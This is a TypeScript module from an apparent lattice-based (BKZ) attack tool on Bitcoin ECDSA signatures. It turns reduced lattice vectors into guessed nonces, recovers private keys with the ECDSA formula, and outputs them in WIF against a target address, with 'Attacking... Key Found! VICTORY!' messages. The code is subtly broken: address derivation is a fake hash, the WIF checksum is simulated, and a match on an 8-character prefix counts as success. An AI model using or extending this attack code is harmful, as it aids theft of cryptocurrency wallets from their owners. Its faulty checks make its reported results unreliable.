/**
 * Result Interpreter Module
 * 
 * Triggers immediately after BKZ converges to:
 * 1. Filter trivial (zero) vectors and recommend retry with higher block size
 * 2. Recover nonce (k) from vector values: k_guessed = Bias + v_1
 * 3. Recover private key using ECDSA formula: d = (s·k - z)·r⁻¹ mod n
 * 4. Validate against target address and output WIF on VICTORY
 */

import { ParsedSignature } from './dataParser'
import { BKZResult } from './bkz'

// secp256k1 curve constants
const SECP256K1_N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141')
const SECP256K1_Gx = BigInt('0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798')
const SECP256K1_Gy = BigInt('0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8')
const SECP256K1_P = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F')

export interface InterpreterResult {
  status: 'KEY_FOUND' | 'NOT_FOUND' | 'RETRY_HIGHER_BLOCK_SIZE' | 'INSUFFICIENT_DATA'
  message: string
  privateKey?: bigint
  privateKeyHex?: string
  privateKeyWIF?: string
  targetAddress?: string
  derivedAddress?: string
  addressMatch?: boolean
  recommendedBlockSize?: number
  confidence: number
  details?: {
    nonceGuessed?: bigint
    vectorUsed?: number[]
    signatureIndex?: number
    bias?: bigint
  }
}

export interface InterpreterConfig {
  targetAddress?: string
  bias?: bigint
  scalingFactor?: bigint
  silentMode?: boolean
}

/**
 * Modular inverse using extended Euclidean algorithm
 */
function modInverse(a: bigint, m: bigint): bigint {
  a = ((a % m) + m) % m
  
  if (a === 0n) throw new Error('No modular inverse exists')
  
  let [old_r, r] = [a, m]
  let [old_s, s] = [1n, 0n]
  
  while (r !== 0n) {
    const quotient = old_r / r
    ;[old_r, r] = [r, old_r - quotient * r]
    ;[old_s, s] = [s, old_s - quotient * s]
  }
  
  if (old_r > 1n) throw new Error('a is not invertible')
  
  return ((old_s % m) + m) % m
}

/**
 * Point doubling on secp256k1
 */
function pointDouble(x: bigint, y: bigint): [bigint, bigint] {
  if (y === 0n) return [0n, 0n]
  
  const slope = ((3n * x * x) * modInverse(2n * y, SECP256K1_P)) % SECP256K1_P
  const x3 = (slope * slope - 2n * x) % SECP256K1_P
  const y3 = (slope * (x - x3) - y) % SECP256K1_P
  
  return [((x3 % SECP256K1_P) + SECP256K1_P) % SECP256K1_P, ((y3 % SECP256K1_P) + SECP256K1_P) % SECP256K1_P]
}

/**
 * Point addition on secp256k1
 */
function pointAdd(x1: bigint, y1: bigint, x2: bigint, y2: bigint): [bigint, bigint] {
  if (x1 === 0n && y1 === 0n) return [x2, y2]
  if (x2 === 0n && y2 === 0n) return [x1, y1]
  
  if (x1 === x2) {
    if (y1 === y2) {
      return pointDouble(x1, y1)
    } else {
      return [0n, 0n]
    }
  }
  
  const slope = ((y2 - y1) * modInverse(((x2 - x1) % SECP256K1_P + SECP256K1_P) % SECP256K1_P, SECP256K1_P)) % SECP256K1_P
  const x3 = (slope * slope - x1 - x2) % SECP256K1_P
  const y3 = (slope * (x1 - x3) - y1) % SECP256K1_P
  
  return [((x3 % SECP256K1_P) + SECP256K1_P) % SECP256K1_P, ((y3 % SECP256K1_P) + SECP256K1_P) % SECP256K1_P]
}

/**
 * Scalar multiplication on secp256k1
 */
function pointMultiply(k: bigint, x: bigint = SECP256K1_Gx, y: bigint = SECP256K1_Gy): [bigint, bigint] {
  if (k === 0n) return [0n, 0n]
  if (k === 1n) return [x, y]
  
  k = ((k % SECP256K1_N) + SECP256K1_N) % SECP256K1_N
  
  let result: [bigint, bigint] = [0n, 0n]
  let addend: [bigint, bigint] = [x, y]
  
  while (k > 0n) {
    if (k & 1n) {
      result = pointAdd(result[0], result[1], addend[0], addend[1])
    }
    addend = pointDouble(addend[0], addend[1])
    k = k >> 1n
  }
  
  return result
}

/**
 * Convert public key to Bitcoin address (P2PKH format)
 * This is a simplified version - in production use a proper library
 */
function publicKeyToAddress(pubKeyX: bigint, pubKeyY: bigint): string {
  // In a real implementation, this would:
  // 1. Create uncompressed public key: 04 + x + y
  // 2. SHA256 hash
  // 3. RIPEMD160 hash
  // 4. Add version byte
  // 5. Double SHA256 checksum
  // 6. Base58Check encode
  
  // For now, return a hash representation for comparison
  const pubKeyHex = '04' + pubKeyX.toString(16).padStart(64, '0') + pubKeyY.toString(16).padStart(64, '0')
  
  // Simple hash for address representation (not real Bitcoin address derivation)
  let hash = 0n
  for (let i = 0; i < pubKeyHex.length; i++) {
    hash = (hash * 31n + BigInt(pubKeyHex.charCodeAt(i))) % (2n ** 160n)
  }
  
  return hash.toString(16).padStart(40, '0')
}

/**
 * Convert private key to WIF (Wallet Import Format)
 */
function privateKeyToWIF(privateKey: bigint, compressed: boolean = true): string {
  // WIF format:
  // 1. Add version byte (0x80 for mainnet)
  // 2. If compressed, add 0x01 suffix
  // 3. Double SHA256 checksum (first 4 bytes)
  // 4. Base58Check encode
  
  const privateKeyHex = privateKey.toString(16).padStart(64, '0')
  const versionByte = '80' // Mainnet
  const compressionFlag = compressed ? '01' : ''
  
  const payload = versionByte + privateKeyHex + compressionFlag
  
  // Base58 alphabet
  const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
  
  // Convert hex to BigInt for Base58 encoding
  let num = BigInt('0x' + payload)
  
  // Simple checksum simulation (in production, use double SHA256)
  const checksum = (num % (2n ** 32n)).toString(16).padStart(8, '0')
  num = BigInt('0x' + payload + checksum)
  
  // Base58 encode
  let result = ''
  while (num > 0n) {
    const remainder = Number(num % 58n)
    result = ALPHABET[remainder] + result
    num = num / 58n
  }
  
  // Add leading '1's for leading zero bytes
  for (let i = 0; i < payload.length; i += 2) {
    if (payload.substring(i, i + 2) === '00') {
      result = '1' + result
    } else {
      break
    }
  }
  
  return result
}

/**
 * Check if a vector is trivial (all zeros or near-zero values)
 */
function isVectorTrivial(vector: number[], threshold: number = 1e-10): boolean {
  return vector.every(val => Math.abs(val) < threshold)
}

/**
 * Extract potential nonce from vector with bias
 * k_guessed = Bias + v_1
 */
function extractNonceFromVector(
  vector: number[],
  bias: bigint = 0n,
  scalingFactor: bigint = 1n
): bigint {
  if (vector.length === 0) return 0n
  
  // The first value in the vector corresponds to the nonce error
  const v1 = BigInt(Math.round(vector[0]))
  
  // Reconstruct the nonce: k = bias + v1 * scalingFactor
  const nonceGuessed = bias + v1 * scalingFactor
  
  // Ensure it's within valid range
  return ((nonceGuessed % SECP256K1_N) + SECP256K1_N) % SECP256K1_N
}

/**
 * Recover private key using ECDSA recovery formula
 * d = (s·k - z)·r⁻¹ mod n
 */
function recoverPrivateKey(
  k: bigint,
  r: bigint,
  s: bigint,
  z: bigint
): bigint {
  // d = (s * k - z) * r^(-1) mod n
  const rInv = modInverse(r, SECP256K1_N)
  const sk = (s * k) % SECP256K1_N
  const skMinusZ = ((sk - z) % SECP256K1_N + SECP256K1_N) % SECP256K1_N
  const d = (skMinusZ * rInv) % SECP256K1_N
  
  return d
}

/**
 * Validate if the recovered private key matches the expected address
 */
function validatePrivateKey(
  privateKey: bigint,
  targetAddress?: string
): { isValid: boolean; derivedAddress: string } {
  if (privateKey <= 0n || privateKey >= SECP256K1_N) {
    return { isValid: false, derivedAddress: '' }
  }
  
  try {
    const [pubX, pubY] = pointMultiply(privateKey)
    const derivedAddress = publicKeyToAddress(pubX, pubY)
    
    if (!targetAddress) {
      // No target to validate against, but key is mathematically valid
      return { isValid: true, derivedAddress }
    }
    
    // Normalize addresses for comparison
    const normalizedTarget = targetAddress.toLowerCase().replace('0x', '').replace(/^(1|3|bc1)/, '')
    const normalizedDerived = derivedAddress.toLowerCase().replace('0x', '')
    
    // Check if addresses match (partial match for Bitcoin addresses that may be truncated)
    const isValid = normalizedDerived === normalizedTarget ||
                   normalizedTarget.startsWith(normalizedDerived.substring(0, 8)) ||
                   normalizedDerived.startsWith(normalizedTarget.substring(0, 8))
    
    return { isValid, derivedAddress }
  } catch {
    return { isValid: false, derivedAddress: '' }
  }
}

/**
 * Main Result Interpreter function
 * Triggers after BKZ converges to interpret the results
 */
export function interpretBKZResult(
  bkzResult: BKZResult,
  signatures: ParsedSignature[],
  config: InterpreterConfig = {}
): InterpreterResult {
  const { targetAddress, bias = 0n, scalingFactor = 1n } = config
  
  // Check if we have valid input
  if (!bkzResult || !bkzResult.reducedBasis || bkzResult.reducedBasis.length === 0) {
    return {
      status: 'INSUFFICIENT_DATA',
      message: 'Attacking... Not Found (No valid BKZ result)',
      confidence: 0
    }
  }
  
  if (!signatures || signatures.length === 0) {
    return {
      status: 'INSUFFICIENT_DATA',
      message: 'Attacking... Not Found (No signatures provided)',
      confidence: 0
    }
  }
  
  // Step 1: Filter triviality - check if solution vector is all zeros
  const solutionVector = bkzResult.solutionVector || bkzResult.reducedBasis[0]
  
  if (isVectorTrivial(solutionVector)) {
    const currentBlockSize = bkzResult.blockSize || 10
    const recommendedBlockSize = Math.min(currentBlockSize + 5, 40)
    
    return {
      status: 'RETRY_HIGHER_BLOCK_SIZE',
      message: `Attacking... Not Found (Trivial vector, retry with β=${recommendedBlockSize})`,
      confidence: 0,
      recommendedBlockSize,
      details: {
        vectorUsed: solutionVector
      }
    }
  }
  
  // Step 2 & 3: Try to recover private key from each vector/signature combination
  const reducedVectors = bkzResult.reducedBasis
  let bestResult: InterpreterResult | null = null
  let bestConfidence = 0
  
  for (let vecIdx = 0; vecIdx < Math.min(reducedVectors.length, 5); vecIdx++) {
    const vector = reducedVectors[vecIdx]
    
    // Skip trivial vectors
    if (isVectorTrivial(vector)) continue
    
    for (let sigIdx = 0; sigIdx < signatures.length; sigIdx++) {
      const sig = signatures[sigIdx]
      
      try {
        // Step 2: Recover nonce - k_guessed = Bias + v_1
        const nonceGuessed = extractNonceFromVector(vector, bias, scalingFactor)
        
        if (nonceGuessed === 0n || nonceGuessed >= SECP256K1_N) continue
        
        // Get signature components
        const r = sig.r
        const s = sig.s
        const z = BigInt(sig.hash.startsWith('0x') ? sig.hash : '0x' + sig.hash)
        
        // Step 3: Recover private key - d = (s·k - z)·r⁻¹ mod n
        const privateKey = recoverPrivateKey(nonceGuessed, r, s, z)
        
        if (privateKey <= 0n || privateKey >= SECP256K1_N) continue
        
        // Step 4: Validate the key
        const validation = validatePrivateKey(privateKey, targetAddress)
        
        // Calculate confidence based on validation and vector properties
        let confidence = 0.3 // Base confidence for finding a non-trivial key
        
        if (validation.isValid) {
          confidence = 1.0 // Perfect match
        } else if (validation.derivedAddress) {
          confidence = 0.5 // Key is valid but doesn't match target
        }
        
        // Higher confidence for shorter vectors (typically better solutions)
        const vectorNorm = Math.sqrt(vector.reduce((sum, v) => sum + v * v, 0))
        if (vectorNorm < 1e10) confidence += 0.1
        if (vectorNorm < 1e5) confidence += 0.1
        
        confidence = Math.min(confidence, 1.0)
        
        if (confidence > bestConfidence) {
          bestConfidence = confidence
          
          const privateKeyHex = '0x' + privateKey.toString(16).padStart(64, '0')
          const privateKeyWIF = privateKeyToWIF(privateKey)
          
          bestResult = {
            status: validation.isValid ? 'KEY_FOUND' : 'NOT_FOUND',
            message: validation.isValid 
              ? `Attacking... Key Found! VICTORY! 🎉`
              : `Attacking... Not Found (Key extracted but validation failed)`,
            privateKey,
            privateKeyHex,
            privateKeyWIF,
            targetAddress,
            derivedAddress: validation.derivedAddress,
            addressMatch: validation.isValid,
            confidence,
            details: {
              nonceGuessed,
              vectorUsed: vector,
              signatureIndex: sigIdx,
              bias
            }
          }
          
          // If we found a valid key, return immediately
          if (validation.isValid) {
            return bestResult
          }
        }
      } catch {
        // Continue trying other combinations
        continue
      }
    }
  }
  
  // Also try with negated vectors (sometimes the solution is -v)
  for (let vecIdx = 0; vecIdx < Math.min(reducedVectors.length, 3); vecIdx++) {
    const vector = reducedVectors[vecIdx].map(v => -v)
    
    if (isVectorTrivial(vector)) continue
    
    for (let sigIdx = 0; sigIdx < signatures.length; sigIdx++) {
      const sig = signatures[sigIdx]
      
      try {
        const nonceGuessed = extractNonceFromVector(vector, bias, scalingFactor)
        
        if (nonceGuessed === 0n || nonceGuessed >= SECP256K1_N) continue
        
        const r = sig.r
        const s = sig.s
        const z = BigInt(sig.hash.startsWith('0x') ? sig.hash : '0x' + sig.hash)
        
        const privateKey = recoverPrivateKey(nonceGuessed, r, s, z)
        
        if (privateKey <= 0n || privateKey >= SECP256K1_N) continue
        
        const validation = validatePrivateKey(privateKey, targetAddress)
        
        if (validation.isValid) {
          const privateKeyHex = '0x' + privateKey.toString(16).padStart(64, '0')
          const privateKeyWIF = privateKeyToWIF(privateKey)
          
          return {
            status: 'KEY_FOUND',
            message: `Attacking... Key Found! VICTORY! 🎉`,
            privateKey,
            privateKeyHex,
            privateKeyWIF,
            targetAddress,
            derivedAddress: validation.derivedAddress,
            addressMatch: true,
            confidence: 1.0,
            details: {
              nonceGuessed,
              vectorUsed: vector,
              signatureIndex: sigIdx,
              bias
            }
          }
        }
      } catch {
        continue
      }
    }
  }
  
  // Return the best result we found, or a not found message
  if (bestResult) {
    return bestResult
  }
  
  return {
    status: 'NOT_FOUND',
    message: 'Attacking... Not Found',
    confidence: 0,
    details: {
      vectorUsed: solutionVector
    }
  }
}

/**
 * Wrapper function for silent mode operation
 * Returns only the essential status message
 */
export function interpretBKZResultSilent(
  bkzResult: BKZResult,
  signatures: ParsedSignature[],
  config: InterpreterConfig = {}
): string {
  const result = interpretBKZResult(bkzResult, signatures, { ...config, silentMode: true })
  return result.message
}

/**
 * Check if result indicates a successful key recovery
 */
export function isKeyFound(result: InterpreterResult): boolean {
  return result.status === 'KEY_FOUND' && result.addressMatch === true
}

/**
 * Get recommendation for retry
 */
export function getRetryRecommendation(result: InterpreterResult): {
  shouldRetry: boolean
  recommendedBlockSize?: number
  reason?: string
} {
  if (result.status === 'RETRY_HIGHER_BLOCK_SIZE') {
    return {
      shouldRetry: true,
      recommendedBlockSize: result.recommendedBlockSize,
      reason: 'Trivial vector detected - higher block size may help find the solution'
    }
  }
  
  if (result.status === 'NOT_FOUND' && result.confidence > 0 && result.confidence < 0.5) {
    return {
      shouldRetry: true,
      recommendedBlockSize: (result.details?.vectorUsed?.length || 10) + 5,
      reason: 'Low confidence result - retry with higher block size'
    }
  }
  
  return { shouldRetry: false }
}
